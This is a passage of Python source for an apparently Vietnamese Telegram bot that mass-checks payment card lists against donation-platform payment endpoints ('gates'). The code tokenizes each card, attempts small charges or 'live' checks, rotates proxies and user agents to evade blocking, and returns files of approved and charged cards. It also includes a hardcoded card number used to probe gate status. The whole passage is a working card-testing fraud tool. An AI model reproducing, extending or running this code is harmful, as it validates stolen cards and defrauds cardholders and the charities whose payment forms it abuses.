                        line_to_save = f"{original_line} | APPROVED‚úÖ | {bin_str_details}"
                    elif status == 'success':
                        try:
                            amount_charged_raw = int(full_response.split('_')[1])
                            amount_in_usd = amount_charged_raw / 100.0
                            charge_msg = f"| Charge {amount_in_usd:.2f}$ th√†nh c√¥ng"
                        except (ValueError, IndexError):
                            charge_msg = "| ƒê√£ charge th√†nh c√¥ng"
                        line_to_save = f"{original_line} {charge_msg} | {bin_str_details}"
                    elif status == 'invalid_format': line_to_save = f"{original_line} | L√Ω do: {full_response}"
                    elif status == 'cancelled': continue
                    elif status == 'error' and had_persistent_error:
                        continue
                    else:
                        if status == 'unknown':
                            line_to_save = f"{original_line} | Kh√¥ng x√°c ƒë·ªãnh"
                        else:
                            line_to_save = f"{original_line} | {bin_str_details}"
                    
                    if line_to_save: result_lists[status].append(line_to_save)

                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"Error processing future for card {original_line} in /mass: {e}", exc_info=True)
                    counts['error'] += 1
                    result_lists['error'].append(f"{original_line} | L·ªói x·ª≠ l√Ω: {e}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent
                    
                    status_lines = [
                        f"**üöÄ ƒêang ti·∫øn h√†nh ki·ªÉm tra...**\n{progress_bar}\n",
                        f"üíª **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**C·ªïng:** `{gate_name}` | **Lu·ªìng:** `{num_threads}`",
                        f"**Ti·∫øn tr√¨nh:** `{processed_count}/{total_lines}`\n"
                    ]
                    
                    is_charge_mode = False
                    if active_gate == 'dalink' and get_multi_link_mode()['mode'] == 'charge':
                        is_charge_mode = True
                    elif active_gate in ['4', '6']:
                        is_charge_mode = True
                    elif active_gate in ['1', '2', '3', '5', '8', '9', '10', '11', '12'] and (
                        (active_gate == '1' and get_gate1_mode() == 'charge') or
                        (active_gate == '2' and get_gate2_mode() == 'charge') or
                        (active_gate == '3' and get_gate3_mode() == 'charge') or
                        (active_gate == '5' and get_gate5_mode() == 'charge') or
                        (active_gate == '8' and get_gate8_mode() == 'charge') or
                        (active_gate == '9' and get_gate9_mode() == 'charge') or
                        (active_gate == '10' and get_gate10_mode() == 'charge') or
                        (active_gate == '11' and get_gate11_mode() == 'charge') or
                        (active_gate == '12' and get_gate12_mode() == 'charge')
                    ):
                        is_charge_mode = True

                    if is_charge_mode:
                        status_lines.append(f"‚úÖ **ƒê√£ Charge:** `{counts['success']}`")
                    
                    status_lines.extend([
                        f"‚úÖ **ƒê∆∞·ª£c ch·∫•p thu·∫≠n:** `{counts['live_success']}`",
                        f"‚ùå **B·ªã t·ª´ ch·ªëi:** `{counts['decline']}`",
                        f"üîí **3D Secure:** `{counts['custom']}`",
                        f"üìã **ƒê·ªãnh d·∫°ng kh√¥ng h·ª£p l·ªá:** `{counts['invalid_format']}`",
                        f"‚ùî **L·ªói:** `{counts['error']}`"
                    ])
                    status_text = "\n".join(status_lines)

                    try: 
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"Error updating /mass progress: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"Unknown error updating /mass progress: {e}")
                    last_update_time = time.time()
                
        duration = time.time() - start_time
        
        counts['cancelled'] = total_lines - processed_count

        if stopped_due_to_http_error:
            final_summary_text = (
                f"üõë **CHECK ƒê√É D·ª™NG - QU√Å NHI·ªÄU L·ªñI HTTP** üõë\n\n"
                f"**L√Ω do:** C√¥ng c·ª• ƒë√£ b·ªã d·ª´ng v√¨ h∆°n 10 th·∫ª kh√¥ng th√†nh c√¥ng v·ªõi l·ªói k·∫øt n·ªëi HTTP li√™n t·ª•c khi s·ª≠ d·ª•ng proxy.\n\n"
                f"**C·ªïng ƒë√£ s·ª≠ d·ª•ng:** `{gate_name}`\n"
                f"**ƒê√£ x·ª≠ l√Ω tr∆∞·ªõc khi d·ª´ng:** `{processed_count}/{total_lines}`\n\n"
                f"K·∫øt qu·∫£ ƒë√£ x·ª≠ l√Ω s·∫Ω ƒë∆∞·ª£c g·ª≠i ƒëi."
            )
        elif gate_died_flag:
            final_summary_text = (
                f"üõë **CHECK ƒê√É D·ª™NG - GATE DIE** üõë\n\n"
                f"**L√Ω do:** C·ªïng kh√¥ng ho·∫°t ƒë·ªông (l·ªói `Forbidden`).\n"
                f"Qu√° tr√¨nh ƒë√£ ƒë∆∞·ª£c d·ª´ng ngay l·∫≠p t·ª©c.\n\n"
                f"**C·ªïng ƒë√£ s·ª≠ d·ª•ng:** `{gate_name}`\n"
                f"**Th·∫ª g√¢y l·ªói:** `{gate_fail_card}`\n"
                f"**ƒê√£ x·ª≠ l√Ω tr∆∞·ªõc khi d·ª´ng:** `{processed_count}/{total_lines}`\n\n"
                f"K·∫øt qu·∫£ ƒë√£ x·ª≠ l√Ω s·∫Ω ƒë∆∞·ª£c g·ª≠i ƒëi."
            )
        elif cancel_event.is_set():
            final_summary_text = (
                f"üõë **T√°c v·ª• ƒë√£ ƒë∆∞·ª£c d·ª´ng theo y√™u c·∫ßu.**\n\n"
                f"ƒê√£ x·ª≠ l√Ω: {processed_count}/{total_lines} th·∫ª. K·∫øt qu·∫£ ƒë√£ x·ª≠ l√Ω s·∫Ω ƒë∆∞·ª£c g·ª≠i ƒëi."
            )
        else:
            summary_lines = [
                f"**üìä Ki·ªÉm tra ho√†n t·∫•t!**\n",
                f"**C·ªïng ƒë√£ s·ª≠ d·ª•ng:** `{gate_name}`",
                f"**T·ªïng c·ªông:** `{total_lines}` | **Lu·ªìng:** `{num_threads}`\n"
            ]
            is_charge_mode = False
            if active_gate == 'dalink' and get_multi_link_mode()['mode'] == 'charge':
                is_charge_mode = True
            elif active_gate in ['4', '6']:
                is_charge_mode = True
            elif active_gate in ['1', '2', '3', '5', '8', '9', '10', '11', '12'] and (
                (active_gate == '1' and get_gate1_mode() == 'charge') or
                (active_gate == '2' and get_gate2_mode() == 'charge') or
                (active_gate == '3' and get_gate3_mode() == 'charge') or
                (active_gate == '5' and get_gate5_mode() == 'charge') or
                (active_gate == '8' and get_gate8_mode() == 'charge') or
                (active_gate == '9' and get_gate9_mode() == 'charge') or
                (active_gate == '10' and get_gate10_mode() == 'charge') or
                (active_gate == '11' and get_gate11_mode() == 'charge') or
                (active_gate == '12' and get_gate12_mode() == 'charge')
            ):
                is_charge_mode = True
            
            if is_charge_mode:
                summary_lines.append(f"‚úÖ **ƒê√£ Charge:** `{counts['success']}`")
            
            summary_lines.extend([
                f"‚úÖ **ƒê∆∞·ª£c ch·∫•p thu·∫≠n:** `{counts['live_success']}`",
                f"‚ùå **B·ªã t·ª´ ch·ªëi:** `{counts['decline']}`",
                f"üîí **3D Secure:** `{counts['custom']}`",
                f"üìã **ƒê·ªãnh d·∫°ng kh√¥ng h·ª£p l·ªá:** `{counts['invalid_format']}`",
                f"‚ùî **L·ªói:** `{counts['error']}`",
                f"üõë **ƒê√£ h·ªßy:** `{counts['cancelled']}`\n",
                f"**‚è±Ô∏è Th·ªùi gian:** `{duration:.2f}s`"
            ])
            final_summary_text = "\n".join(summary_lines)
        
        await status_message.edit_text(final_summary_text, reply_markup=None)

        summary_data = {'counts': counts, 'original_filename': document.file_name}
        save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
        
        update_user_stats(user.id, user, counts)
        
        # --- NEW: Custom filenames for multi-link mode ---
        file_prefix = "MultiLink_" if active_gate == 'dalink' else ""

        file_map = {
            'success': f'{file_prefix}charged.txt', 
            'live_success': f'{file_prefix}approved.txt', 
            'decline': f'{file_prefix}declined.txt',
            'custom': f'{file_prefix}3d_secure.txt', 
            'invalid_format': f'{file_prefix}invalid_format.txt',
            'error': f'{file_prefix}errors.txt', 
            'unknown': f'{file_prefix}unknown.txt'
        }
        for status, filename in file_map.items():
            if result_lists[status]:
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f: f.write("\n".join(result_lists[status]))
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=update.effective_chat.id, document=doc)

        if user.id == ADMIN_ID and result_lists['error_debug']:
            debug_path = os.path.join(session_dir, "debug_admin.txt")
            with open(debug_path, 'w', encoding='utf-8') as f: f.write("\n\n---\n\n".join(result_lists['error_debug']))
            with open(debug_path, 'rb') as doc: await context.bot.send_document(chat_id=ADMIN_ID, document=doc)

    except Exception as e:
        logger.error(f"Error in mass_check: {e}", exc_info=True)
        await status_message.edit_text(f"‚õîÔ∏è **L·ªói nghi√™m tr·ªçng!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

async def stop_command(update, context):
    user = update.effective_user
    target_user_id = user.id

    if user.id == ADMIN_ID and context.args:
        try: target_user_id = int(context.args[0])
        except (ValueError, IndexError):
            await update.message.reply_text("‚ùå ID ng∆∞·ªùi d√πng kh√¥ng h·ª£p l·ªá. S·ª≠ d·ª•ng: `/stop <user_id>`"); return
    elif user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text("B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y."); return

    if target_user_id in CANCELLATION_EVENTS:
        CANCELLATION_EVENTS[target_user_id].set()
        if target_user_id == user.id:
            await update.message.reply_text("‚è≥ ƒê√£ g·ª≠i y√™u c·∫ßu d·ª´ng. T√°c v·ª• s·∫Ω d·ª´ng sau khi ho√†n th√†nh c√°c th·∫ª ƒëang ki·ªÉm tra...")
        else:
            await update.message.reply_text(f"‚è≥ ƒê√£ g·ª≠i y√™u c·∫ßu d·ª´ng t√°c v·ª• c·ªßa ng∆∞·ªùi d√πng `{target_user_id}`.")
    else:
        if target_user_id == user.id:
            await update.message.reply_text("‚ÑπÔ∏è B·∫°n kh√¥ng c√≥ t√°c v·ª• /mass ho·∫∑c /multi n√†o ƒëang ch·∫°y.")
        else:
            await update.message.reply_text(f"‚ÑπÔ∏è Ng∆∞·ªùi d√πng `{target_user_id}` kh√¥ng c√≥ t√°c v·ª• n√†o ƒëang ch·∫°y.")


# --- MANAGEMENT & NOTIFICATION COMMANDS ---

async def active_checks_command(update, context):
    """(Admin) Shows currently running tasks with stop buttons."""
    if update.effective_user.id != ADMIN_ID: return

    if not ACTIVE_CHECKS:
        await update.message.reply_text("‚úÖ Hi·ªán kh√¥ng c√≥ t√°c v·ª• ki·ªÉm tra n√†o ƒëang ch·∫°y.")
        return

    message = "üèÉ‚Äç‚ôÇÔ∏è **C√°c t√°c v·ª• ƒëang ho·∫°t ƒë·ªông:**\n\n"
    now = time.time()
    
    keyboard = []
    active_checks_copy = dict(ACTIVE_CHECKS)

    for user_id, data in active_checks_copy.items():
        duration = now - data.get('start_time', now)
        username = f"@{data.get('username')}" if data.get('username') else "N/A"
        full_name = data.get('full_name', 'N/A')
        task_type = data.get('task_type', 'N/A').upper()
        
        message += (f"üë§ **Ng∆∞·ªùi d√πng:** {full_name} ({username}) | ID: `{user_id}`\n"
                    f"   - **L·ªánh:** `/{task_type}`\n"
                    f"   - **Th·ªùi gian ch·∫°y:** `{int(duration)}` gi√¢y\n"
                    f"--------------------\n")
        
        keyboard.append([InlineKeyboardButton(f"üõë D·ª´ng t√°c v·ª• c·ªßa {full_name}", callback_data=f"stop_task_{user_id}")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup)


def _perform_gate_check(gate_id: str, card_line: str):
    """
    Helper function to perform a detailed check on a specific gate for the /status command.
    Returns: (overall_status, transaction_id_info, second_request_response)
    """
    cc, mes, ano, cvv = card_line.split('|')
    ano_full = f"20{ano}"
    session = requests.Session()

    proxy_config = load_proxies()
    if proxy_config.get("enabled") and proxy_config.get("proxies"):
        try:
            proxy_str = random.choice(proxy_config["proxies"])
            proxy_dict = _format_proxy_for_requests(proxy_str)
            if proxy_dict:
                session.proxies = proxy_dict
                logger.info(f"Status check for Gate {gate_id} using proxy.")
        except IndexError:
            logger.warning("Proxy enabled but list is empty for status check.")

    user_agent = random_user_agent()
    transaction_id = None
    transaction_id_info = "Not attempted."
    second_request_response = "Not attempted."
    overall_status = "Unknown ‚ùì"

    random_form_part_12 = ''.join(random.choices(string.digits, k=12))
    form_id_12 = f"2508080{random_form_part_12}"

    gate_configs = {
        '1': {'formId': "250806042656273071", 'merchantId': "3000022877"},
        '2': {'formId': "250806055626003241", 'merchantId': "3000022877"},
        '3': {'formId': "250807082606088731", 'merchantId': "3000022877"},
        '4': {'formId': "250807155854598300", 'merchantId': "3000022877"},
        '5': {'formId': "250807181638869139", 'merchantId': "3000022877"},
        '6': {'formId': "250802205541759546", 'merchantId': "3000022877"},
        '7': {'formId': "250802162822879268", 'merchantId': "3000022877"},
        '8': {'formId': "250804202812044270", 'merchantId': "3000022877"},
        '9': {'formId': "250805043713003023", 'merchantId': "3000022877"},
        '10': {'formId': "250807190400178471", 'merchantId': "3000022877"},
        '11': {'formId': "250808040558588645", 'merchantId': "3000022877"},
        '12': {'formId': form_id_12, 'merchantId': "3000022877"}
    }
    
    config = gate_configs.get(gate_id)
    
    if not config:
        return "Unknown ‚ùì", f"Gate {gate_id} not configured", "N/A"

    try:
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = {
            "mode": "TOKENIZE", "formId": config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA",
            "merchantId": config['merchantId'], "browserUserAgent": user_agent, "browserJavaEnabled": "false",
            "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152",
            "browserScreenWidth": "2048", "browserTZ": "-420"
        }
        tokenize_headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com", "X-Requested-With": "XMLHttpRequest", "User-Agent": user_agent}
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, max_retries=2)

        if error: transaction_id_info = f"Error: {error}"
        elif not token_response: transaction_id_info = "HTTP Error with no response"
        else:
            try:
                token_data = token_response.json()
                transaction_id = token_data.get("transactionId")
                if transaction_id: transaction_id_info = transaction_id
                else: transaction_id_info = f"Failed. Response: {token_response.text}"
            except json.JSONDecodeError: transaction_id_info = f"Failed. Non-JSON response: {token_response.text}"
    except Exception as e:
        transaction_id_info = f"System Error: {e}"
        return "Check Error üî¥", transaction_id_info, "Skipped due to Tokenization failure."

    if not transaction_id:
        return "Offline üî¥", transaction_id_info, "Skipped due to Tokenization failure."

    try:
        random_first_name, random_last_name = generate_random_string(10), generate_random_string(12)
        random_cardholder = f"{random_first_name} {random_last_name}"
        payment_payload, payment_url = {}, ""

        # Using a single generic payload structure for testing
        base_payload = {"test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": 50}, "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}}

        # This part can be simplified since many payloads are similar for a status check
        if gate_id in ['1', '2', '3', '5', '8', '9', '10', '11', '12']:
            payment_url = "https://api.raisenow.io/payments" # Default to payment for testing
        elif gate_id in ['4', '6']:
             payment_url = "https://api.raisenow.io/payments"
        elif gate_id == '7':
             payment_url = "https://api.raisenow.io/payment-sources"
        
        # A minimal payload might be enough to check for a 'Forbidden' error
        min_payload = {
            "account_uuid": "01bd7c99-eefc-42d2-91e4-4a020f6b5cfc", # A sample UUID
            "test_mode": False,
            "amount": {"currency": "EUR", "value": 50},
            "payment_information": {"transaction_id": transaction_id}
        }

        payment_headers = {"Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent}
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=min_payload, headers=payment_headers, timeout=20, max_retries=2)

        if error:
            second_request_response = f"Error: {error}"
            overall_status = "Check Error üî¥"
        elif not payment_response:
            second_request_response = "HTTP Error with no response"
            overall_status = "Offline üî¥"
        else:
            second_request_response = payment_response.text
            if '{"message":"Forbidden"}' in second_request_response: overall_status = "Offline üî¥"
            else: overall_status = "Active üü¢"
    except Exception as e:
        second_request_response = f"System Error: {e}"
        overall_status = "Check Error üî¥"

    return overall_status, transaction_id_info, second_request_response


async def status_command(update, context):
    """Checks the operational status of the payment gateways."""
    if update.effective_user.id != ADMIN_ID: return
    
    msg = await update.message.reply_text("‚è≥ ƒêang ki·ªÉm tra tr·∫°ng th√°i c·ªïng... Vui l√≤ng ƒë·ª£i.")
    
    test_card = "5196032172122570|4|28|766"

    gate_ids = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12']
    
    with ThreadPoolExecutor(max_workers=len(gate_ids)) as executor:
        future_to_gate = {executor.submit(_perform_gate_check, gid, test_card): gid for gid in gate_ids}
        results = {}
        for future in as_completed(future_to_gate):
            gid = future_to_gate[future]
            try:
                status, transaction_id_info, response = future.result()
                results[gid] = (status, transaction_id_info, response)
            except Exception as e:
                results[gid] = ("Check Error üî¥", "N/A", str(e))

    final_message = "üìä **TR·∫†NG TH√ÅI C·ªîNG THANH TO√ÅN** üìä\n\n"
    for gid in sorted(results.keys(), key=lambda x: int(x)):
        status, transaction_id_info, response = results.get(gid, ("Unknown", "N/A", "No result"))
        
        try:
            parsed_json = json.loads(response)
            response_display = json.dumps(parsed_json, indent=2)
        except (json.JSONDecodeError, TypeError):
            response_display = str(response)

        response_display = response_display[:1000]
        gate_name_full = get_formatted_gate_name(gid)

        final_message += (
            f"**{gate_name_full}**\n"
            f"**Tr·∫°ng th√°i:** {status}\n"
            f"**Request 1 (Tokenize):** `transactionId: {transaction_id_info}`\n"
            f"**Request 2 Response:**\n```json\n{response_display}\n```\n"
            f"----------------------------------------\n"
        )

    if len(final_message) > 4096:
        with io.BytesIO(final_message.encode('utf-8')) as doc:
            await update.message.reply_document(document=doc, filename="gate_status.txt")
    else:
        await msg.edit_text(final_message)


async def gate_command(update, context):
    """Command to change the check gate (Admin only)."""
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        current_gate = get_active_gate()
        current_gate_name = get_formatted_gate_name(current_gate)
        await update.message.reply_text(f"‚ÑπÔ∏è C·ªïng ho·∫°t ƒë·ªông hi·ªán t·∫°i: **{current_gate_name}**.\n\nS·ª≠ d·ª•ng `/gate [1-12]` ho·∫∑c `/dalink` ƒë·ªÉ thay ƒë·ªïi.")
        return
        
    new_gate = context.args[0]
    if new_gate == '1':
        keyboard = [[InlineKeyboardButton("üí∞ Charge", callback_data="setgate1mode_charge"), InlineKeyboardButton("‚ö° Check Live", callback_data="setgate1mode_live")]]
        await update.message.reply_text("Vui l√≤ng ch·ªçn m·ªôt ch·∫ø ƒë·ªô cho **Gate 1**:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif new_gate == '2':
        keyboard = [[InlineKeyboardButton("üí∞ Charge", callback_data="setgate2mode_charge"), InlineKeyboardButton("‚ö° Check Live", callback_data="setgate2mode_live")]]
        await update.message.reply_text("Vui l√≤ng ch·ªçn m·ªôt ch·∫ø ƒë·ªô cho **Gate 2**:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif new_gate == '3':
        keyboard = [[InlineKeyboardButton("üí∞ Charge", callback_data="setgate3mode_charge"), InlineKeyboardButton("‚ö° Check Live", callback_data="setgate3mode_live")]]
        await update.message.reply_text("Vui l√≤ng ch·ªçn m·ªôt ch·∫ø ƒë·ªô cho **Gate 3**:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif new_gate == '5':
        keyboard = [[InlineKeyboardButton("üí∞ Charge", callback_data="setgate5mode_charge"), InlineKeyboardButton("‚ö° Check Live", callback_data="setgate5mode_live")]]
        await update.message.reply_text("Vui l√≤ng ch·ªçn m·ªôt ch·∫ø ƒë·ªô cho **Gate 5**:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif new_gate == '8':
        keyboard = [[InlineKeyboardButton("üí∞ Charge", callback_data="setgate8mode_charge"), InlineKeyboardButton("‚ö° Check Live", callback_data="setgate8mode_live")]]
        await update.message.reply_text("Vui l√≤ng ch·ªçn m·ªôt ch·∫ø ƒë·ªô cho **Gate 8**:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif new_gate == '9':
        keyboard = [[InlineKeyboardButton("üí∞ Charge", callback_data="setgate9mode_charge"), InlineKeyboardButton("‚ö° Check Live", callback_data="setgate9mode_live")]]
        await update.message.reply_text("Vui l√≤ng ch·ªçn m·ªôt ch·∫ø ƒë·ªô cho **Gate 9**:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif new_gate == '10': 
        keyboard = [[InlineKeyboardButton("üí∞ Charge", callback_data="setgate10mode_charge"), InlineKeyboardButton("‚ö° Check Live", callback_data="setgate10mode_live")]]
        await update.message.reply_text("Vui l√≤ng ch·ªçn m·ªôt ch·∫ø ƒë·ªô cho **Gate 10**:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif new_gate == '11':
        keyboard = [[InlineKeyboardButton("üí∞ Charge V11", callback_data="setgate11mode_charge"), InlineKeyboardButton("‚ö° Check Live V11", callback_data="setgate11mode_live")]]
        await update.message.reply_text("Vui l√≤ng ch·ªçn m·ªôt ch·∫ø ƒë·ªô cho **Gate 11**:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif new_gate == '12':
        keyboard = [[InlineKeyboardButton("üí∞ Charge V12", callback_data="setgate12mode_charge"), InlineKeyboardButton("‚ö° Check Live V12", callback_data="setgate12mode_live")]]
        await update.message.reply_text("Vui l√≤ng ch·ªçn m·ªôt ch·∫ø ƒë·ªô cho **Gate 12**:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif new_gate in ['4', '6', '7']:
        set_active_gate(new_gate)
        new_gate_name = get_formatted_gate_name(new_gate)
        await update.message.reply_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
    else:
        await update.message.reply_text("‚ùå C·ªïng kh√¥ng h·ª£p l·ªá. Vui l√≤ng ch·ªçn t·ª´ `1-12`.")

async def set_gate_range_command(update, context):
    """(Admin) Set the charge range for a gate. /setgate <id> <min> <max>"""
    if update.effective_user.id != ADMIN_ID: return
        
    if len(context.args) != 3:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/setgate <gate_id> <min_amount> <max_amount>`\nV√≠ d·ª•: `/setgate 6 50 200` (charge t·ª´ $0.50 ƒë·∫øn $2.00)\n`gate_id` c√≥ th·ªÉ l√† `dalink`.")
        return
        
    try:
        gate_id, min_str, max_str = context.args
        valid_gates = [str(i) for i in range(1, 13)] + ['dalink']
        if gate_id not in valid_gates:
            await update.message.reply_text("‚ùå `gate_id` ph·∫£i t·ª´ 1 ƒë·∫øn 12 ho·∫∑c 'dalink'.")
            return
        min_val = int(min_str)
        max_val = int(max_str)
        if min_val > max_val:
            await update.message.reply_text("‚ùå `min_amount` kh√¥ng th·ªÉ l·ªõn h∆°n `max_amount`.")
            return
        if min_val < 0 or max_val < 0:
            await update.message.reply_text("‚ùå S·ªë ti·ªÅn ph·∫£i l√† s·ªë d∆∞∆°ng.")
            return
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá. Vui l√≤ng nh·∫≠p s·ªë cho min v√† max.")
        return

    ranges = load_json_file(GATE_RANGES_FILE)
    ranges[gate_id] = {"min": min_val, "max": max_val}
    save_json_file(GATE_RANGES_FILE, ranges)
    
    new_gate_name = get_formatted_gate_name(gate_id)
    await update.message.reply_text(f"‚úÖ C·∫≠p nh·∫≠t th√†nh c√¥ng!\n**Gate {gate_id}** b√¢y gi·ªù s·∫Ω charge m·ªôt s·ªë ti·ªÅn ng·∫´u nhi√™n trong kho·∫£ng **${min_val/100:.2f} - ${max_val/100:.2f}$**.\nT√™n hi·ªÉn th·ªã m·ªõi: `{new_gate_name}`")


async def turn_bot_off(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not is_bot_on():
        await update.message.reply_text("‚ÑπÔ∏è Bot ƒë√£ **T·∫Øt** r·ªìi."); return

    set_bot_status(False)
    await update.message.reply_text("‚úÖ Bot hi·ªán ƒë√£ **T·∫ÆT**. ƒêang g·ª≠i th√¥ng b√°o...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    message = MESSAGES["bot_off"]
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Could not send bot off notification to user {user_id}: {e}")
        await asyncio.sleep(0.1) 
    
    await update.message.reply_text(f"üì¢ Th√¥ng b√°o b·∫£o tr√¨ ƒë√£ ƒë∆∞·ª£c g·ª≠i.\n- Th√†nh c√¥ng: {success_count}\n- Th·∫•t b·∫°i: {fail_count}")

async def turn_bot_on(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if is_bot_on():
        await update.message.reply_text("‚ÑπÔ∏è Bot ƒë√£ **B·∫≠t** r·ªìi."); return
    
    set_bot_status(True)
    await update.message.reply_text("‚úÖ Bot hi·ªán ƒë√£ **B·∫¨T**. ƒêang g·ª≠i th√¥ng b√°o...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    message = MESSAGES["bot_on"]
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Could not send bot on notification to user {user_id}: {e}")
        await asyncio.sleep(0.1)

    await update.message.reply_text(f"üì¢ Th√¥ng b√°o ho·∫°t ƒë·ªông tr·ªü l·∫°i ƒë√£ ƒë∆∞·ª£c g·ª≠i.\n- Th√†nh c√¥ng: {success_count}\n- Th·∫•t b·∫°i: {fail_count}")

async def send_message_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if len(context.args) < 2:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/send <user_id> <message>`"); return
        
    try: target_user_id = int(context.args[0])
    except ValueError: await update.message.reply_text("‚ùå ID ng∆∞·ªùi d√πng kh√¥ng h·ª£p l·ªá."); return
        
    message_to_send = " ".join(context.args[1:])
    
    try:
        await context.bot.send_message(chat_id=target_user_id, text=f"‚úâÔ∏è **Tin nh·∫Øn t·ª´ Admin:**\n\n{message_to_send}")
        await update.message.reply_text(f"‚úÖ ƒê√£ g·ª≠i tin nh·∫Øn ƒë·∫øn ng∆∞·ªùi d√πng `{target_user_id}`.")
    except Exception as e:
        await update.message.reply_text(f"‚ùå G·ª≠i tin nh·∫Øn th·∫•t b·∫°i: `{e}`")

async def send_all_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/sendall <message>`"); return
        
    message_to_send = " ".join(context.args)
    authorized_users = load_users()
    
    if not authorized_users:
        await update.message.reply_text("‚ÑπÔ∏è Kh√¥ng c√≥ th√†nh vi√™n ƒë∆∞·ª£c ·ªßy quy·ªÅn n√†o ƒë·ªÉ g·ª≠i tin nh·∫Øn."); return
        
    await update.message.reply_text(f"üì¢ B·∫Øt ƒë·∫ßu g·ª≠i tin nh·∫Øn ƒë·∫øn `{len(authorized_users)}` th√†nh vi√™n...")
    
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=f"üì¢ **Th√¥ng b√°o t·ª´ Admin:**\n\n{message_to_send}")
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Could not broadcast to user {user_id}: {e}")
        await asyncio.sleep(0.1)
        
    await update.message.reply_text(f"üèÅ Ho√†n t·∫•t g·ª≠i tin nh·∫Øn!\n- Th√†nh c√¥ng: `{success_count}`\n- Th·∫•t b·∫°i: `{fail_count}`")

async def show_check_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE)
    if not stats:
        await update.message.reply_text("Ch∆∞a c√≥ d·ªØ li·ªáu th·ªëng k√™ n√†o."); return
    
    message = "üìä **TH·ªêNG K√ä CHECK C·ª¶A NG∆Ø·ªúI D√ôNG** üìä\n\n"
    all_users_to_show = load_users()
    all_users_to_show.add(ADMIN_ID)

    for user_id in sorted(list(all_users_to_show)):
        user_id_str = str(user_id)
        data = stats.get(user_id_str)
        if isinstance(data, dict):
            username = data.get('username')
            user_display = f"@{escape_markdown(str(username))}" if username else f"ID: {user_id_str}"
            message += (f"üë§ **{user_display}** (`{user_id_str}`)\n"
                        f"  ‚úÖ ƒê√£ Charge: `{data.get('total_charged', 0)}`\n"
                        f"  ‚úÖ ƒê∆∞·ª£c ch·∫•p thu·∫≠n: `{data.get('total_live_success', 0)}`\n"
                        f"  üîí Custom: `{data.get('total_custom', 0)}`\n"
                        f"  ‚ùå B·ªã t·ª´ ch·ªëi: `{data.get('total_decline', 0)}`\n"
                        f"  ‚ùî L·ªói: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                        f"  üïí L·∫ßn check cu·ªëi: `{data.get('last_check_timestamp', 'Ch∆∞a bao gi·ªù')}`\n"
                        f"--------------------\n")
        else:
            message += (f"üë§ **ID: {user_id_str}**\n"
                        f"  *Ch∆∞a bao gi·ªù check ho·∫∑c d·ªØ li·ªáu b·ªã h·ªèng.*\n"
                        f"--------------------\n")
    
    if len(message) > 4096:
